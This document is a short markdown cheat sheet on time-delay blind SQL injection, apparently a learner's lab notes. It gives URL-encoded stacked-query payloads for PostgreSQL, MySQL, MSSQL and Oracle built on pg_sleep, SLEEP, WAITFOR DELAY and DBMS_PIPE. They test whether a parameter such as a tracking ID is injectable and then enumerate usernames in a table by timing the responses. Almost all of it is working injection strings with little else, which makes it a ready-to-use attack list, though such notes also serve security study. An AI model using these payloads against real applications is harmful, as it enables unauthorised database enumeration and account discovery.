
## Time Delay Based SQLi

- In time-delay based SQL injection, we cannot see any results or error messages from the application. So instead, we rely on how long the database takes to respond. By crafting payloads that introduce a delay when a condition is **true**, and no delay when it is **false**, we can infer information based on the response time. This allows us to perform enumeration by asking true/false questions and observing whether the server response is delayed or not.

### 1. Check Parameter Vulnerability

```sql
'
''
/*
find out which parameter is vulnerable to SQLi first.
Insert each payload above to look for database response variation.
The paramter can be a trackingID, sessionID etc...
*/
```

### 2. Testing Entries

```sql
-- PostgreSQL
'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

-- MySQL / MariaDB
'%3BSELECT+IF(1=1,SLEEP(10),SLEEP(0))#
'%3BSELECT+IF(1=2,SLEEP(10),SLEEP(0))#

-- Microsoft SQL Server (MSSQL)
'%3BIF(1=1)+WAITFOR+DELAY+'0:0:10'--
'%3BIF(1=2)+WAITFOR+DELAY+'0:0:10'--

-- Oracle
'%3BSELECT+CASE+WHEN+(1=1)+THEN+DBMS_PIPE.RECEIVE_MESSAGE('ADS',10)+ELSE+NULL+END+FROM+DUAL--
'%3BSELECT+CASE+WHEN+(1=2)+THEN+DBMS_PIPE.RECEIVE_MESSAGE('ADS',10)+ELSE+NULL+END+FROM+DUAL--


/*
since blind sqli don't return visible results so
the payloads are designed to ask true/false questions using time delay and 
based on that we can perform database enumeration. Time delay in seconds so 10 = 10 seconds.
Check both the payloads of the corresponding database version 1=1 and 1=2 conditions and determine whether the database takes time to respond or not. 

%3B means ; (semicolon) 
Use `%3B` instead of `;` because `;` is a special character in URLs and may be blocked, split, or misinterpreted by servers or filters. Encoding it as `%3B` ensures it is safely transmitted and reaches the database reliably.
You can also write (;) and then select the entire payload and click URL encoding option.
*/
```

### 3. Checking Users

```sql
-- PostgreSQL
'%3BSELECT+CASE+WHEN+(<username column>='<username>')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+<table_name>--

-- MySQL / MariaDB
'%3BSELECT+IF((<username column>='<username>'),SLEEP(10),SLEEP(0))#

-- Microsoft SQL Server (MSSQL)
'%3BIF(<username column>='<username>')+WAITFOR+DELAY+'0:0:10'--

-- Oracle
'%3BSELECT+CASE+WHEN+(<username column>='<username>')+THEN+DBMS_PIPE.RECEIVE_MESSAGE('ADS',10)+ELSE+NULL+END+FROM+<table_name>--
```

---
## Examining the Database

[SQLi CHEATSHEET PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

